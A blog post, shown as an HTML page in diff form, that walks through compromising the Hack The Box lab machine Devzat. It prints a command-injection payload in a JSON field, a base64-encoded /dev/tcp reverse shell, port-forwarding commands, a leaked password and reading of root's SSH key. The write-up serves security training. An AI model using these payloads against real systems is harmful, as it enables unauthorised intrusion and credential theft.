@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Devzat Hackthebox writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  <link href="//www.google-analytics.com" rel="dns-prefetch">
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the souce-code for a bot , the bot has 2 versions one of them is running locally and it has a command &amp;ldquo;file&amp;rdquo; which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Devzat Hackthebox writeup">
+    <meta name="twitter:description" content="In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the souce-code for a bot , the bot has 2 versions one of them is running locally and it has a command &amp;ldquo;file&amp;rdquo; which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root
+">
+    <meta name="twitter:image" content="/media/devzat/20220311132144.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Devzat Hackthebox writeup">
+  <meta property="og:description" content="In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the souce-code for a bot , the bot has 2 versions one of them is running locally and it has a command &amp;ldquo;file&amp;rdquo; which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root
+">
+  <meta property="og:url" content="/post/devzat/">
+  <meta property="og:image" content="/media/devzat/20220311132144.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/devzat/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/grey-prism.svg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Devzat Hackthebox writeup</h1>
+      <p class="post-meta">@0xMesbaha · Mar 11, 2022 · 6 min read</p>
+    </header>
+    <article class="post-content"><p>In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the souce-code for a bot , the bot has 2 versions one of them is running locally and it has a command &ldquo;file&rdquo; which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root</p>
+<h1 id="scanning-">Scanning :</h1>
+<p>i will start with basic scanning :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T <span style="color:#ae81ff">4</span> -sV 10.10.11.118
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">3072</span> c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://devzat.htb/
+8000/tcp open  ssh     <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-Go
+| ssh-hostkey:
+|_  <span style="color:#ae81ff">3072</span> 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+
+</code></pre></div><p>and we can see  <code>devzat.htb</code> at the scan result so we can add it to the <code>/etc/hosts</code> and start fuzzing vhosts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.devzat.htb&#34;</span> -fc 302,404
+
+pets                    <span style="color:#f92672">[</span>Status: 200, Size: 510, Words: 20, Lines: 21<span style="color:#f92672">]</span>
+</code></pre></div><p>we can add <code>pets.devzat.htb</code> also to the <code>/etc/hosts</code></p>
+<h1 id="enumeration-">Enumeration :</h1>
+<h3 id="discovery">Discovery</h3>
+<p>we can start enumerating the <strong>devzat.htb</strong> web application first. we can see it talks about some chat application and can try it with :</p>
+<p><img src="/media/devzat/20220311134725.png" alt="image"></p>
+<p>so we can try it using :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -l Mesbaha  devzat.htb -p <span style="color:#ae81ff">8000</span>
+</code></pre></div><p>looking for help to know how to use it :</p>
+<p><img src="/media/devzat/20220311135035.png" alt="image"></p>
+<p><img src="/media/devzat/20220311135132.png" alt="image"></p>
+<p>okay we will check it latter after we finish discovery phase</p>
+<p>visiting <strong>pets.devzat.htb</strong> we have the option to add new item</p>
+<p><img src="/media/devzat/20220311135355.png" alt="image"></p>
+<p>we can also see how the request is sent :</p>
+<p><img src="/media/devzat/20220311135703.png" alt="image"></p>
+<p>okay now we have some leads , we can also start directory busting to check if there is something interesting</p>
+<h3 id="directory-busting">Directory Busting</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dirsearch -u http://devzat.htb/  -w /usr/share/wordlists/dirb/common.txt
+
+<span style="color:#f92672">[</span>06:55:30<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  309B  - /assets  -&gt;  http://devzat.htb/assets/
+<span style="color:#f92672">[</span>06:55:35<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  309B  - /images  -&gt;  http://devzat.htb/images/
+<span style="color:#f92672">[</span>06:55:35<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    6KB - /index.html
+<span style="color:#f92672">[</span>06:55:35<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  313B  - /javascript  -&gt;  http://devzat.htb/javascript/
+<span style="color:#f92672">[</span>06:55:40<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  275B  - /server-status
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dirsearch -u http://pets.devzat.htb/  -w /usr/share/wordlists/dirb/common.txt
+
+<span style="color:#f92672">[</span>06:58:36<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   23B  - /.git/HEAD
+<span style="color:#f92672">[</span>06:58:39<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -   42B  - /build  -&gt;  /build/
+<span style="color:#f92672">[</span>06:58:40<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -   40B  - /css  -&gt;  /css/
+<span style="color:#f92672">[</span>06:58:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /server-status
+</code></pre></div><p>this <strong>/.git</strong> seems worthy to check</p>
+<p><img src="/media/devzat/20220311140209.png" alt="image"></p>
+<p>we need to download all of this and check them</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -r http://pets.devzat.htb/.git/
+</code></pre></div><p>once i am introduced with a <strong>.git</strong> i always use <a href="https://github.com/internetwache/GitTools">GitTools</a> to make the enumeration easier.</p>
+<p>i will start with the <strong>extractor</strong> to see broken repository commits and incompleted commits.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./extractor.sh pets.devzat.htb pets.dump
+</code></pre></div><p>and we have these 3 commits :</p>
+<pre><code>0-ef07a04ebb2fc92cf74a39e0e4b843630666a705  1-8274d7a547c0c3854c074579dfc359664082a8f6  2-464614f32483e1fde60ee53f5d3b4d468d80ff62
+</code></pre><p>we can run the <strong>tree</strong> command to have an overview look , we will see a <strong>main.go</strong> in all the folders we can take a look at it and will find :</p>
+<p><img src="/media/devzat/20220311141743.png" alt="image"></p>
+<p>it seems the &ldquo;<strong>species</strong>&rdquo; attribute which we sent in the <strong>pets.devzat.htb</strong> is not filtered before being passed to <strong>exec.Command</strong></p>
+<p>we can try some command injection and see if it works</p>
+<h1 id="foothold">Foothold</h1>
+<p>at the <strong>pets.devzat.htb</strong> page we can now try to add an item again but this time we will try to ping our host:</p>
+<pre><code>{&quot;name&quot;:&quot;pingme&quot;,&quot;species&quot;:&quot;cat;ping -c 4 10.10.16.106&quot;}
+</code></pre><p><img src="/media/devzat/20220311142344.png" alt="image"></p>
+<p>nice we got a reply , now Let&rsquo;s have a reverse shell !</p>
+<p><img src="https://media.giphy.com/media/uNp22kQO4QCxa/giphy.gif" alt="Alt Text"></p>
+<p>however when i tried <code>sh -i &gt;&amp; /dev/tcp/10.10.16.106/9090 0&gt;&amp;1</code> it doesn&rsquo;t return a connection back so i though maybe the spaces and special characters are the reason .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;sh -i &gt;&amp; /dev/tcp/10.10.16.106/9090 0&gt;&amp;1&#34;</span> | base64
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA2LzkwOTAgMD4mMQo<span style="color:#f92672">=</span>
+</code></pre></div><p><img src="/media/devzat/20220311143241.png" alt="image"></p>
+<p>and finally :</p>
+<p><img src="/media/devzat/20220311143301.png" alt="image"></p>
+<p>spawn a tty shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+ctrl+z
+stty raw -echo ;fg
+Enter key x2
+export TERM<span style="color:#f92672">=</span>xterm
+</code></pre></div><p>and we have a nice shell as <strong>patrick</strong> user on the machine</p>
+<h2 id="enumerating-the-machine">Enumerating the machine</h2>
+<p>at the  <code>/etc/passwd </code> we can see this strange <strong>backup</strong></p>
+<pre><code>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</code></pre><p>we can visit this <strong>/var/backups/</strong> maybe it contains useful information can help us escalate our privilege</p>
+<p><img src="/media/devzat/20220311151418.png" alt="image"></p>
+<p>But only user <strong>catherine</strong> can use it so we should find a way to escalate to this user first :(</p>
+<pre><code>-rw-------  1 catherine catherine 28297 Jul 16  2021 devzat-dev.zip
+-rw-------  1 catherine catherine 27567 Jul 16  2021 devzat-main.zip
+
+</code></pre><p>if we run <code>ss-lpnut</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:5000          0.0.0.0:*               LISTEN      836/./petshop       
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
+tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -                   
+tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
+tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::8000                 :::*                    LISTEN      837/./devchat
+</code></pre></div><p>we can see port <strong>8443</strong> and port <strong>8086</strong> are running locally , and there is no netcat on the machine to know what are the services running. so we have to make port forward to see the ports running.</p>
+<h3 id="port-forward">port forward</h3>
+<p>forward port <strong>8086</strong> from the machine to your side.</p>
+<p><em>first:</em> generate ssh keys</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh-keygen  -f devzat
+</code></pre></div><p>and put your public key at the <strong>authorized_keys</strong> on the machine side</p>
+<p><em>Second</em>: forward the port :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># at your side</span>
+ssh  -i devzat -N -L 8086:127.0.0.1:8086  patrick@devzat.htb
+</code></pre></div><p>now if we have scanned our localhost will find :</p>
+<p><img src="/media/devzat/20220311162554.png" alt="image"></p>
+<p>if we search for this version of the service will find immediatley  <a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">this</a> exploit</p>
+<p><img src="/media/devzat/20220311163816.png" alt="image">
+<img src="/media/devzat/20220311164104.png" alt="image">
+<img src="/media/devzat/20220311164145.png" alt="image">
+<img src="/media/devzat/20220311164415.png" alt="image">
+<img src="/media/devzat/20220311165802.png" alt="image"></p>
+<p>and we can see the user <strong>catherine</strong> shows up with this password : <code>woBeeYareedahc7Oogeephies7Aiseci</code></p>
+<p>now we can switch to user <strong>catherine</strong> easily :</p>
+<p><img src="/media/devzat/20220311170147.png" alt="image"></p>
+<h1 id="root-access">Root access:</h1>
+<p>now as we are logged in as the user <strong>catherine</strong> we can check the <code>/var/backups</code> which we can&rsquo;t access earlier.</p>
+<p>download them at our machine first :</p>
+<p><img src="/media/devzat/20220311170412.png" alt="image"></p>
+<p>after we unzip them we can see they have exact same files , so we can check if there are any difference between the content</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">diff main/commands.go dev/commands.go
+</code></pre></div><p><img src="/media/devzat/20220311171227.png" alt="image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">&lt; 	<span style="color:#a6e22e">commands</span> = []<span style="color:#a6e22e">commandInfo</span>{<span style="color:#a6e22e">clear</span>, <span style="color:#a6e22e">message</span>, <span style="color:#a6e22e">users</span>, <span style="color:#a6e22e">all</span>, <span style="color:#a6e22e">exit</span>, <span style="color:#a6e22e">bell</span>, <span style="color:#a6e22e">room</span>, <span style="color:#a6e22e">kick</span>, <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">_commands</span>, <span style="color:#a6e22e">nick</span>, <span style="color:#a6e22e">color</span>, <span style="color:#a6e22e">timezone</span>, <span style="color:#a6e22e">emojis</span>, <span style="color:#a6e22e">help</span>, <span style="color:#a6e22e">tictactoe</span>, <span style="color:#a6e22e">hangman</span>, <span style="color:#a6e22e">shrug</span>, <span style="color:#a6e22e">asciiArt</span>, <span style="color:#a6e22e">exampleCode</span>}
+<span style="color:#f92672">---</span>
+&gt; 	<span style="color:#a6e22e">commands</span> = []<span style="color:#a6e22e">commandInfo</span>{<span style="color:#a6e22e">clear</span>, <span style="color:#a6e22e">message</span>, <span style="color:#a6e22e">users</span>, <span style="color:#a6e22e">all</span>, <span style="color:#a6e22e">exit</span>, <span style="color:#a6e22e">bell</span>, <span style="color:#a6e22e">room</span>, <span style="color:#a6e22e">kick</span>, <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">_commands</span>, <span style="color:#a6e22e">nick</span>, <span style="color:#a6e22e">color</span>, <span style="color:#a6e22e">timezone</span>, <span style="color:#a6e22e">emojis</span>, <span style="color:#a6e22e">help</span>, <span style="color:#a6e22e">tictactoe</span>, <span style="color:#a6e22e">hangman</span>, <span style="color:#a6e22e">shrug</span>, <span style="color:#a6e22e">asciiArt</span>, <span style="color:#a6e22e">exampleCode</span>, <span style="color:#a6e22e">file</span>}
+&gt; }
+
+</code></pre></div><p>and we can the option <strong>&ldquo;file&rdquo;</strong> , if we read the source code we will find :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file <span style="color:#f92672">=</span> commandInfo<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#e6db74">&#34;Paste a files content directly to chat [alpha]&#34;</span>, fileCommand, 1, false, nil<span style="color:#f92672">}</span>
+
+</code></pre></div><p>and will find :</p>
+<p><img src="/media/devzat/20220311172609.png" alt="image"></p>
+<p>but if we tried the connection command will see the command <strong>/file</strong> doesn&rsquo;t exist :(</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -l mesbah devzat.htb -p <span style="color:#ae81ff">8000</span>
+</code></pre></div><p><img src="/media/devzat/20220311172636.png" alt="image"></p>
+<p>we can read other codes under the <strong>dev</strong> file we have and will find at <strong>&ldquo;devchat.go&rdquo;</strong></p>
+<p><img src="/media/devzat/20220311172810.png" alt="image"></p>
+<p>this port is running locally we can forward it then connect to the bot :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># at your side :</span>
+ssh -i devzat  -L 8443:127.0.0.1:8443 -N patrick@devzat.htb
+</code></pre></div><p>then connect to the bot :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -l mesbah 127.0.0.1 -p <span style="color:#ae81ff">8443</span>
+</code></pre></div><p><img src="/media/devzat/20220311173041.png" alt="image"></p>
+<p>now we can read the <strong>root.txt</strong> , or we can read the <strong>/root/.ssh/id_rsa</strong> to gain the root access</p>
+<p><img src="/media/devzat/20220311173249.png" alt="image"></p>
+<p><img src="/media/devzat/20220311173315.png" alt="image"></p>
+<h2 id="pwned">Pwned</h2>
+<p><img src="https://media.giphy.com/media/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif" alt="Alt Text"></p></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+        
+          <li><a href="/tags/rce"><span class="tag">Rce</span></a></li>
+        
+          <li><a href="/tags/port-forwarding"><span class="tag">Port Forwarding</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+  </body>
+</html>
